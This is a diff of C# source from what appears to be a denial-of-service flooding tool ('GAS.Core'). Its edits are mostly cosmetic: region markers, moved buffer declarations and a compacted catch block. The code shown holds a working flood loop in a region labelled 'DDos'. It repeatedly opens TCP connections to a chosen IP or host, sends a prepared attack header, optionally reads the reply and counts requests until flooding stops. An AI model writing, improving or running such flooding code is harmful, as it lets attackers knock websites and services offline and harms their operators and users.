@@ -54,12 +54,17 @@ namespace GAS.Core
         }
         private void bw_DoWork(object indexinthreads)
         {
+            #region Wait 4 init
             while (!init)
                 Thread.Sleep(100);
             int MY_INDEX_FOR_WORK = (int) indexinthreads;
+            #endregion
             try
             {
                 #region Prepare
+                int bfsize = 1024; // this should be less than the MTU
+                byte[] recvBuf = new byte[bfsize];
+                int recvd = 0;
                 byte[] buf;
                 #region Headers
                 if (this._attacktype == 0)
@@ -85,24 +90,23 @@ namespace GAS.Core
                                 AttackHeader));
                 }
                 #endregion
-                int bfsize = 1024; // this should be less than the MTU
-                byte[] recvBuf = new byte[bfsize];
-                int recvd = 0;
                 #endregion
                 #region DDos
                 while (IsFlooding)
                 {
-                    #region New source
                     States[MY_INDEX_FOR_WORK] =  ReqState.Ready;
                     recvBuf = new byte[bfsize];
+                    #region Connect
                     Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                     States[MY_INDEX_FOR_WORK] = ReqState.Connecting;
                     try { socket.Connect(this.IPOrDns ? IP : DNS, Port); } catch { continue; }
                     socket.Blocking = Resp;
                     States[MY_INDEX_FOR_WORK] = ReqState.Requesting;
                     socket.Send(buf, SocketFlags.None);
+                    #endregion
                     States[MY_INDEX_FOR_WORK] = ReqState.Downloading;
                         Requested++;
+                        #region Download page
                         if (Resp)
                         {
                             try
@@ -112,15 +116,12 @@ namespace GAS.Core
                                 while (false);//(recvd > bfsize) && socket.Connected);
                                 Downloaded++;
                             }
-                            catch
-                            {
-                                Failed++;
-                            }
+                            catch { Failed++; }
                         }
-                    States[MY_INDEX_FOR_WORK] = ReqState.Completed; 
+                        #endregion
+                        States[MY_INDEX_FOR_WORK] = ReqState.Completed; 
                         Downloaded++;
                     if (Delay > 0) System.Threading.Thread.Sleep(Delay + 1);
-                    #endregion
                 }
                 #endregion
             }
